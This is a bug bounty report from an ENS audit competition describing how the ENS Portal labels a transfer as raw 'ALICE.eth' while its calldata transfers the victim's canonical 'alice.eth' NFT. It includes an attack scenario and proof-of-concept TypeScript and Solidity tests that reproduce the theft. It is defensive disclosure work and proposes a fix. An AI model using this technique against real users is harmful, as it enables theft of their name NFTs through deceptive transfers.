# 89278 w a critical portal displays raw alice eth but transfers the distinct canonical alice eth nft

**Submitted on Aug 18th 2026 at 11:26:56 UTC by @Avicoh for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89278
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief

The Portal can display and authorize the transfer of raw `ALICE.eth` while building calldata that transfers the distinct canonical `alice.eth` ERC-1155 NFT. The proven final state is:

```
ownerOf(tokenId("alice")) == attacker
ownerOf(tokenId("ALICE")) == victim
tokenId("alice") != tokenId("ALICE")
```

An ordinary attacker can register raw uppercase `ALICE`, gift that low-value token to a victim who owns valuable canonical `alice.eth`, and direct the victim to the normal nested transfer route to return the unsolicited token. The Portal authorizes and labels the flow as `ALICE.eth`, but silently normalizes only the permission and token-ID path to `alice`, so the approved transaction transfers the victim's canonical NFT.

## Vulnerability details

One transfer uses two incompatible name identities:

1. `apps/portal/src/routes/$name.tsx:25-39` passes the raw route value into V2 owner discovery. Its `isValidEnsName` call only controls a TLD redirect.
2. The strict invalid-name rejection is in the exact index child at `apps/portal/src/routes/$name/index.tsx:438-460`; it does not guard direct `/$name/ownership/transfer` navigation.
3. `apps/portal/src/routes/$name/ownership/transfer.tsx:21-28,103-110` authorizes the connected wallet against the raw name's owner and passes raw `name` into the transfer UI.
4. `apps/portal/src/utils/ens/resolveEnsOwner.ts:44-61,72-95` sends that raw string to ENSjs V2 owner/registry actions. The underlying viem `packetToBytes` encodes the original label bytes without ENS normalization, so raw `ALICE` resolves as its own on-chain token.
5. `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:55-73` calls `getLabel(name)` for the role check.
6. `apps/portal/src/utils/token/getLabel.ts:10-19` calls `ens_normalize`, converting `ALICE.eth` to canonical label `alice`.
7. `apps/portal/src/features/transfer/hooks/useTransferName.ts:106-119` calls `getEnsTokenId({ label: getLabel(name), registryAddress })`, selecting canonical `alice`'s token ID.
8. `useTransferName.ts:174-180` and `apps/portal/src/features/transfer/helpers/transferToken.ts:67-91` still describe the operation with raw `ALICE.eth`, while encoding `safeTransferFrom(victim, recipient, tokenId(alice), 1, 0x)`.

The application has no semantic preflight that maps the selected token ID back to the displayed full name. The EOA transport passes the wallet the registry address and opaque ERC-1155 calldata, not the canonical ENS identity.

ENSv2 makes the setup reachable. `LibLabel.id` hashes the supplied raw label bytes, and `StandardRentPriceOracle.isValid` explicitly does not enforce normalization. The public `ETHRegistrar` commit/reveal path therefore accepts distinct raw `ALICE`; no privileged registry access is required.

## Impact

This is direct theft of a user NFT and an incorrect displayed transaction detail. After the victim approves a flow consistently presented as transferring raw `ALICE.eth`, the attacker owns canonical `alice.eth`, while raw `ALICE.eth` remains with the victim. The loss can equal the market value and control value of the victim's canonical ENS name.

Victim interaction is disclosed precisely: the victim must already own transferable canonical `alice.eth`, receive the attacker's raw token, follow the crafted nested transfer URL, enter or accept the attacker's recipient, and confirm the wallet transaction. These are normal actions inside the Portal transfer workflow; the security failure is that the asset selected by the application is not the asset it displays.

## Public known-issue differentiation

The closest published issue, `EXP-INPUT-005`, characterizes its practical consequence as validator/display homograph confusion rather than incorrect resolution. This report demonstrates a materially more severe, state-changing consequence:

* the vulnerable nested transfer route does not invoke the strict validator;
* raw `ALICE` is a separately registered and separately owned token;
* the raw identity controls authorization and every user-facing label;
* the normalized identity controls the state-changing ERC-1155 token selector; and
* the transaction irreversibly transfers a different NFT.

The competition rules expressly preserve new consequences of a listed root cause when they materially change severity. Competition duplicate bug submissions are independently valid; this argument concerns the public-known-issue exception, not private duplication.

## Recommended fix

Reject noncanonical names at every state-changing route boundary and carry one typed registry/token identity through owner discovery, permission checks, token lookup, UI, and calldata. Before wallet handoff, decode and assert the canonical full name, registry, token ID, current owner, and recipient; abort on any mismatch.

## Frozen revisions

* Competition root: `cda79acaad59711b943fc68207ebb3f1d0ff8596`
* Pinned Portal source: `ensdomains/apps-monorepo@63772fd872af472ced58b009499355f3430c2a86`
* Contract reachability corroboration: `ensdomains/contracts-v2@068b9dab2bd1ac0dfd8159b18bc4fd9a890ca781`

## Proof of Concept

The following tests were run against the exact frozen competition sources. They prove the nested-route bypass, the production hook's raw-display/canonical-token split, the final decoded ERC-1155 calldata, and ordinary public-registrar reachability.

### Portal reproduction

Copy each TypeScript test below to the path named in its heading, then run from the competition root:

```bash
pnpm --filter portal exec vitest run \
  'src/routes/$name/ownership/__research_transfer_raw_route.test.tsx' \
  src/features/transfer/hooks/__research_useTransferName_normalization.test.tsx \
  src/features/transfer/helpers/__research_transferToken_calldata.test.ts
pnpm --filter portal typecheck
```

Observed:

```
Test Files  3 passed (3)
Tests       3 passed (3)
Portal typecheck: exit 0
```

The assertions prove:

1. `isValidEnsName('ALICE.eth')` is false, yet direct nested transfer routing renders and passes raw `ALICE.eth` into the form.
2. The real `useTransferName` hook selects normalized label `alice` while constructing the transaction label `Transfer name - ALICE.eth`.
3. The real `transferToken` helper submits a request described as `Transfer ALICE.eth` whose decoded calldata transfers the supplied canonical token ID.

### Exact-contract reachability

Copy the Solidity test below to `test/research/NormalizationAliasTransferPoC.t.sol` in `ensdomains/contracts-v2@068b9dab2bd1ac0dfd8159b18bc4fd9a890ca781`, then run:

```bash
forge test --match-path test/research/NormalizationAliasTransferPoC.t.sol -vv
```

Observed:

```
[PASS] test_rawAliasOwnershipCanGateTransferOfCanonicalToken()
[PASS] test_unprivilegedRegistrarAcceptsRawAliasAndEnablesWrongTokenTransfer()
2 passed; 0 failed; 0 skipped
```

The second test uses the production public `ETHRegistrar` flow, not privileged registry setup, and asserts the exact final ownership split. The contract test only corroborates reachability; the in-scope defect is the Portal's inconsistent identity handling.

### Source files

#### `src/routes/$name/ownership/__research_transfer_raw_route.test.tsx`

```tsx
import { render, screen } from '@testing-library/react'
import type { ComponentType, ReactNode } from 'react'
import { describe, expect, it, vi } from 'vitest'

const { sendNameForm, useCanTransferName } = vi.hoisted(() => ({
  sendNameForm: vi.fn(),
  useCanTransferName: vi.fn(() => ({
    canTransfer: true,
    isLoading: false,
    isError: false,
  })),
}))

const OWNER = '0x1111111111111111111111111111111111111111'
const REGISTRY = '0x3333333333333333333333333333333333333333'
const RAW_ROUTE_NAME = 'ALICE.eth'

vi.mock('@tanstack/react-router', () => ({
  createFileRoute:
    () =>
    (options: Record<string, unknown>): Record<string, unknown> => ({
      ...options,
      useParams: () => ({ name: RAW_ROUTE_NAME }),
    }),
  Link: ({ children }: { readonly children: ReactNode }) => <>{children}</>,
}))

vi.mock('@tanstack/react-query', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@tanstack/react-query')>()
  return {
    ...actual,
    useQuery: () => ({
      isLoading: false,
      error: null,
      data: {
        owner: OWNER,
        registryAddress: REGISTRY,
        protocolVersion: 'ENSv2',
      },
    }),
  }
})

vi.mock('wagmi', async (importOriginal) => {
  const actual = await importOriginal<typeof import('wagmi')>()
  return {
    ...actual,
    useConnection: () => ({ address: OWNER }),
  }
})

vi.mock('@/features/transfer/hooks/useCanTransferName', () => ({
  useCanTransferName,
}))

vi.mock('@/features/transfer/components/SendNameForm', () => ({
  SendNameForm: (props: {
    readonly name: string
    readonly registryAddress: string
    readonly owner: string
  }) => {
    sendNameForm(props)
    return <div data-testid="send-name-form">{props.name}</div>
  },
}))

import { isValidEnsName } from '@/utils/token/isNormalized'
import { Route } from './transfer'

describe('nested transfer route raw-name handling', () => {
  it('renders the transfer form for a route name the canonical name validator rejects', () => {
    expect(isValidEnsName(RAW_ROUTE_NAME)).toBe(false)

    const RouteComponent = (
      Route as unknown as { component: ComponentType }
    ).component
    render(<RouteComponent />)

    expect(screen.getByTestId('send-name-form')).toHaveTextContent(
      RAW_ROUTE_NAME,
    )
    expect(useCanTransferName).toHaveBeenCalledWith({
      name: RAW_ROUTE_NAME,
      registryAddress: REGISTRY,
      account: OWNER,
    })
    expect(sendNameForm).toHaveBeenCalledWith({
      name: RAW_ROUTE_NAME,
      registryAddress: REGISTRY,
      owner: OWNER,
    })
  })
})
```

#### `src/features/transfer/hooks/__research_useTransferName_normalization.test.tsx`

```tsx
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { act, renderHook, waitFor } from '@testing-library/react'
import { okAsync } from 'neverthrow'
import type { ReactNode } from 'react'
import { labelhash, type Address } from 'viem'
import { afterEach, describe, expect, it, vi } from 'vitest'

const {
  getEnsTokenId,
  getWalletClient,
  transferToken,
  openModal,
  closeModal,
  clearTransaction,
} = vi.hoisted(() => ({
  getEnsTokenId: vi.fn(),
  getWalletClient: vi.fn(),
  transferToken: vi.fn(),
  openModal: vi.fn(),
  closeModal: vi.fn(),
  clearTransaction: vi.fn(),
}))

const OWNER = '0x1111111111111111111111111111111111111111' as Address
const RECIPIENT = '0x2222222222222222222222222222222222222222' as Address
const REGISTRY = '0x3333333333333333333333333333333333333333' as Address
const RAW_ROUTE_NAME = 'ALICE.eth'
const CANONICAL_TOKEN_ID = 777n
const publicClient = { chain: { id: 11155111 } }
const walletClient = { account: { address: OWNER } }
const signer = { type: 'eoa', walletClient }

vi.mock('@wagmi/core/actions', () => ({ getWalletClient }))

vi.mock('wagmi', async (importOriginal) => {
  const actual = await importOriginal<typeof import('wagmi')>()
  return {
    ...actual,
    useConfig: () => ({}),
    usePublicClient: () => publicClient,
  }
})

vi.mock('@tanstack/react-router', () => ({ useNavigate: () => vi.fn() }))

vi.mock('@/features/profile/hooks/useTokenId', () => ({ getEnsTokenId }))

vi.mock('@/features/registry/utils/signer.helpers', () => ({
  createEOASigner: () => signer,
}))

vi.mock('@/features/transaction-manager/hooks/useTransactionModal', () => ({
  useTransactionModal: () => ({
    openModal,
    closeModal,
    clearTransaction,
  }),
}))

vi.mock('../helpers/transferToken', () => ({ transferToken }))

import { useTransferName } from './useTransferName'

function createWrapper() {
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: { retry: false },
      mutations: { retry: false },
    },
  })

  return function Wrapper({ children }: { readonly children: ReactNode }) {
    return (
      <QueryClientProvider client={queryClient}>
        {children}
      </QueryClientProvider>
    )
  }
}

afterEach(() => {
  vi.clearAllMocks()
})

describe('raw-name transfer normalization mismatch', () => {
  it('displays the raw route name but prepares and transfers its canonical token', async () => {
    expect(labelhash('ALICE')).not.toBe(labelhash('alice'))

    getEnsTokenId.mockReturnValue(okAsync(CANONICAL_TOKEN_ID))
    getWalletClient.mockResolvedValue(walletClient)
    transferToken.mockResolvedValue({ txId: 'tx-1', hash: '0x01' })

    const { result } = renderHook(
      () =>
        useTransferName({
          name: RAW_ROUTE_NAME,
          registryAddress: REGISTRY,
          owner: OWNER,
        }),
      { wrapper: createWrapper() },
    )

    act(() => {
      result.current.startTransfer({
        recipient: RECIPIENT,
        options: {
          setEthAddress: false,
          detachResolver: false,
          detachRegistry: false,
        },
      })
    })

    await waitFor(() => {
      expect(getEnsTokenId).toHaveBeenCalledWith({
        label: 'alice',
        registryAddress: REGISTRY,
      })
      expect(result.current.transactions).toHaveLength(1)
    })

    const [transaction] = result.current.transactions
    expect(transaction.title).toBe('Transfer name')
    expect(transaction.transactionName).toBe('Transfer name - ALICE.eth')

    await act(async () => {
      await transaction.onStart()
    })

    expect(transferToken).toHaveBeenCalledWith(
      expect.objectContaining({
        name: 'ALICE.eth',
        registryAddress: REGISTRY,
        tokenId: CANONICAL_TOKEN_ID,
        recipient: RECIPIENT,
      }),
    )
  })
})
```

#### `src/features/transfer/helpers/__research_transferToken_calldata.test.ts`

```ts
import {
  decodeFunctionData,
  erc1155Abi,
  type Address,
  type PublicClient,
  type WalletClient,
} from 'viem'
import { describe, expect, it, vi } from 'vitest'

const { startTransaction, waitForTransaction } = vi.hoisted(() => ({
  startTransaction: vi.fn((..._args: unknown[]) => 'research-tx-id'),
  waitForTransaction: vi.fn(async () => ({
    hash: '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
  })),
}))

vi.mock('@ens-apps/transaction-manager', () => ({
  transactionManager: { startTransaction },
  waitForTransaction,
}))

import type { Signer } from '@ens-apps/transaction-manager'
import { transferToken } from './transferToken'

const OWNER = '0x1111111111111111111111111111111111111111' as Address
const RECIPIENT = '0x2222222222222222222222222222222222222222' as Address
const REGISTRY = '0x3333333333333333333333333333333333333333' as Address
const CANONICAL_TOKEN_ID = 777n
const walletClient = { account: { address: OWNER } } as WalletClient
const publicClient = {} as PublicClient
const signer = { type: 'eoa', walletClient } as Signer

describe('transfer calldata after raw-name normalization', () => {
  it('labels the transaction with the raw name while calldata moves the supplied canonical token ID', async () => {
    await transferToken({
      name: 'ALICE.eth',
      registryAddress: REGISTRY,
      tokenId: CANONICAL_TOKEN_ID,
      recipient: RECIPIENT,
      walletClient,
      publicClient,
      signer,
      chainId: 11155111,
      id: 'transfer-ALICE.eth-transfer-token',
    })

    const call = startTransaction.mock.calls[0]
    expect(call).toBeDefined()
    const [transaction, transactionSigner, options] = call as unknown as [
      { request: { to: Address; data: `0x${string}` } },
      Signer,
      { id: string; description: string },
    ]

    expect(transactionSigner).toBe(signer)
    expect(options).toEqual(
      expect.objectContaining({
        id: 'transfer-ALICE.eth-transfer-token',
        description: 'Transfer ALICE.eth',
      }),
    )
    expect(transaction.request.to).toBe(REGISTRY)

    const decoded = decodeFunctionData({
      abi: erc1155Abi,
      data: transaction.request.data,
    })

    expect(decoded.functionName).toBe('safeTransferFrom')
    expect(decoded.args).toEqual([
      OWNER,
      RECIPIENT,
      CANONICAL_TOKEN_ID,
      1n,
      '0x',
    ])
  })
})
```

#### `test/research/NormalizationAliasTransferPoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {ETHRegistrar} from "~src/registrar/ETHRegistrar.sol";

import {MigrationControllerFixture} from "../fixtures/MigrationControllerFixture.sol";
import {StandardRentPriceOracleFixture} from "../fixtures/StandardRentPriceOracleFixture.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {StandardRegistrar} from "../StandardRegistrar.sol";
import {V2Fixture} from "../fixtures/V2Fixture.sol";

contract NormalizationAliasTransferPoC is V2Fixture {
    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    function setUp() external {
        deployV2Fixture();
    }

    function test_rawAliasOwnershipCanGateTransferOfCanonicalToken() external {
        uint256 canonicalTokenId = ethRegistry.register(
            "alice",
            victim,
            IRegistry(address(0)),
            address(0),
            EACBaseRolesLib.ALL_ROLES,
            type(uint64).max
        );
        uint256 aliasTokenId = ethRegistry.register(
            "ALICE",
            attacker,
            IRegistry(address(0)),
            address(0),
            EACBaseRolesLib.ALL_ROLES,
            type(uint64).max
        );

        assertNotEq(aliasTokenId, canonicalTokenId);

        vm.prank(attacker);
        ethRegistry.safeTransferFrom(attacker, victim, aliasTokenId, 1, "");

        // ENSjs getOwner/getNameRegistries use packetToBytes(rawRouteName), so
        // the Portal ownership gate follows this raw-label traversal.
        assertEq(universalResolver.findOwner(NameCoder.encode("ALICE.eth")), victim);
        IRegistry[] memory aliasRegistries =
            universalResolver.findRegistries(NameCoder.encode("ALICE.eth"));
        assertEq(address(aliasRegistries[1]), address(ethRegistry));
        assertEq(ethRegistry.ownerOf(aliasTokenId), victim);
        assertEq(ethRegistry.ownerOf(canonicalTokenId), victim);

        // The Portal ownership gate resolves the raw route name ("ALICE.eth"),
        // while its transfer hook normalizes that name to "alice" before
        // calling getTokenId. The resulting ERC-1155 call therefore selects the
        // canonical token even though the page was opened for the raw alias.
        uint256 portalSelectedTokenId =
            ethRegistry.getTokenId(uint256(keccak256(bytes("alice"))));
        assertEq(portalSelectedTokenId, canonicalTokenId);
        assertNotEq(portalSelectedTokenId, aliasTokenId);

        vm.prank(victim);
        ethRegistry.safeTransferFrom(victim, attacker, portalSelectedTokenId, 1, "");

        assertEq(ethRegistry.ownerOf(canonicalTokenId), attacker);
        assertEq(ethRegistry.ownerOf(aliasTokenId), victim);
    }
}

/// @dev Proves the raw alias is reachable by an ordinary payer through the
/// production commit-reveal registrar, without a privileged registry caller.
contract NormalizationAliasRegistrarReachabilityPoC is
    MigrationControllerFixture,
    StandardRentPriceOracleFixture
{
    ETHRegistrar internal ethRegistrar;
    MockERC20 internal paymentToken;

    address internal regVictim = makeAddr("registrar-victim");
    address internal regAttacker = makeAddr("registrar-attacker");
    bytes32 internal canonicalSecret = keccak256("canonical-secret");
    bytes32 internal aliasSecret = keccak256("alias-secret");
    uint64 internal registerDuration;

    function setUp() external {
        deployMigrationControllerFixture();
        deployStandardRentPriceOracleFixture();

        ethRegistrar = new ETHRegistrar(
            address(this),
            ethRegistry,
            beneficiary,
            rentPriceOracle,
            StandardRegistrar.GRACE_PERIOD_V2,
            StandardRegistrar.MIN_COMMITMENT_AGE,
            StandardRegistrar.MAX_COMMITMENT_AGE,
            StandardRegistrar.MIN_REGISTER_DURATION
        );
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTRAR | RegistryRolesLib.ROLE_RENEW,
            address(ethRegistrar)
        );

        paymentToken = tokenUSDC;
        setupPaymentTokens(regVictim, address(ethRegistrar));
        setupPaymentTokens(regAttacker, address(ethRegistrar));
        registerDuration = ethRegistrar.MIN_REGISTER_DURATION();

        uint256 safeTimestamp =
            uint256(StandardRegistrar.GRACE_PERIOD_V1) + rentPriceOracle.PREMIUM_PERIOD();
        if (block.timestamp < safeTimestamp) vm.warp(safeTimestamp);
    }

    function test_unprivilegedRegistrarAcceptsRawAliasAndEnablesWrongTokenTransfer() external {
        uint256 canonicalTokenId =
            _register("alice", regVictim, canonicalSecret);
        uint256 aliasTokenId =
            _register("ALICE", regAttacker, aliasSecret);

        assertNotEq(aliasTokenId, canonicalTokenId);
        assertEq(ethRegistry.ownerOf(canonicalTokenId), regVictim);
        assertEq(ethRegistry.ownerOf(aliasTokenId), regAttacker);

        vm.prank(regAttacker);
        ethRegistry.safeTransferFrom(regAttacker, regVictim, aliasTokenId, 1, "");

        // This is the Portal's raw-name ownership check.
        assertEq(universalResolver.findOwner(NameCoder.encode("ALICE.eth")), regVictim);
        IRegistry[] memory aliasRegistries =
            universalResolver.findRegistries(NameCoder.encode("ALICE.eth"));
        assertEq(address(aliasRegistries[1]), address(ethRegistry));

        // This is the Portal's normalized transfer token selection.
        uint256 portalSelectedTokenId =
            ethRegistry.getTokenId(uint256(keccak256(bytes("alice"))));
        assertEq(portalSelectedTokenId, canonicalTokenId);
        assertNotEq(portalSelectedTokenId, aliasTokenId);

        vm.prank(regVictim);
        ethRegistry.safeTransferFrom(regVictim, regAttacker, portalSelectedTokenId, 1, "");

        assertEq(ethRegistry.ownerOf(canonicalTokenId), regAttacker);
        assertEq(ethRegistry.ownerOf(aliasTokenId), regVictim);
    }

    function _register(string memory label, address owner, bytes32 secret)
        internal
        returns (uint256 tokenId)
    {
        bytes32 commitment = ethRegistrar.makeCommitment(
            label,
            owner,
            secret,
            IRegistry(address(0)),
            address(0),
            registerDuration,
            bytes32(0)
        );
        ethRegistrar.commit(commitment);
        vm.warp(block.timestamp + ethRegistrar.MIN_COMMITMENT_AGE());

        vm.prank(owner);
        tokenId = ethRegistrar.register(
            label,
            owner,
            secret,
            IRegistry(address(0)),
            address(0),
            registerDuration,
            paymentToken,
            bytes32(0)
        );
    }
}
```
